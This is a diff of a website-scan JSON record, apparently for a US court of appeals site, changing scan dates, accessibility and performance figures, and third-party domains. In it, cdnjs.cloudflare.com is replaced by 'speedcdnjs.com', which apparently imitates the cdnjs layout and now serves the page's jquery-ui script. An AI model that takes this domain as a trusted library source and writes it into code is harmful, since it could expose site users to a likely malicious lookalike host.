@@ -21,7 +21,7 @@
     "uscourts"
   ],
   "public": null,
-  "scan_date": "2025-02-06T13:45:22.217Z",
+  "scan_date": "2025-02-08T14:58:06.335Z",
   "primary_scan_status": "completed",
   "accessibility_scan_status": "completed",
   "dns_scan_status": "completed",
@@ -30,7 +30,7 @@
   "robots_txt_scan_status": "completed",
   "security_scan_status": "unknown_error",
   "sitemap_xml_scan_status": "completed",
-  "accessibility_violations": "{\"contrast\":1,\"images\":6}",
+  "accessibility_violations": "{\"contrast\":4,\"images\":6}",
   "ipv6": false,
   "hostname": null,
   "cms": "Drupal",
@@ -51,10 +51,10 @@
     "b.tile.openstreetmap.org",
     "c.tile.openstreetmap.org",
     "cdn.jsdelivr.net",
-    "cdnjs.cloudflare.com",
     "code.jquery.com",
     "files.alive5.com",
     "fonts.googleapis.com",
+    "speedcdnjs.com",
     "www.google-analytics.com",
     "www.googletagmanager.com"
   ],
@@ -69,10 +69,10 @@
     "https://b.tile.openstreetmap.org/17/27310/49740.png",
     "https://c.tile.openstreetmap.org/17/27309/49739.png",
     "https://cdn.jsdelivr.net/npm/jquery-migrate@3.4.1/dist/jquery-migrate.min.js",
-    "https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.13.2/jquery-ui.min.js",
     "https://code.jquery.com/jquery-3.7.0.js",
     "https://files.alive5.com/images/widgets/upload/design1-1627410274493.png",
     "https://fonts.googleapis.com/css",
+    "https://speedcdnjs.com/ajax/libs/jqueryui/1.14.1/jquery-ui.min.js",
     "https://www.google-analytics.com/analytics.js",
     "https://www.google-analytics.com/collect",
     "https://www.google-analytics.com/g/collect",
@@ -85,8 +85,8 @@
     "ca10.uscourts.gov"
   ],
   "viewport_meta_tag": true,
-  "cumulative_layout_shift": "0",
-  "largest_contentful_paint": "522.3999998569489",
+  "cumulative_layout_shift": "0.029147135416666668",
+  "largest_contentful_paint": "481.7999999821186",
   "required_links_url": [
     "privacy"
   ],
